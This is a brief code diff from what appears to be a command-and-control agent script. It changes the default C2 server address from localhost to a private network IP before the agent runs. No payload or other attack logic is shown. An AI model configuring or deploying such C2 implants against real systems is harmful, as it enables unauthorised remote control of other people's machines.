@@ -549,7 +549,7 @@ class Agent:
             
 if __name__ == "__main__":
     # Get C2 server URL from arguments or use default
-    server_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5001"
+    server_url = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.220.141:5001"
     
     # Create and run agent
     agent = Agent(server_url)
